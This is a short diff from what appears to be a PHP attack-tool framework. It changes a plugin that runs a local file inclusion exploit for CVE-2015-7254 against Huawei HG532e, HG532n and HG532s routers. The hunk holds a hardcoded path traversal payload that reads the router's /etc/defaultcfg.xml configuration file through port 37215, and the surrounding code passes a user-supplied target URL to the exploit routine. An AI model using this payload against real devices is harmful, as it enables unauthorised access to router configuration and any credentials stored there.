@@ -80,6 +80,7 @@ class Lfiplugins extends Larfi {
         $lfi=new Larfi();
         $f3->set('exploit_title', 'HUAWEI LFI (cve-2015-7254) Huawei HG532e, HG532n, & HG532s');
         $this->response->data['SUBPART'] = 'lfi_page.html';
+		$blankurl=$f3->devoid('POST.url');
         $url=$f3->get('POST.url');
         $payload=":37215/icon/../../../etc/defaultcfg.xml";
         return $this->uri_based_lfi($blankurl,$url,$payload);
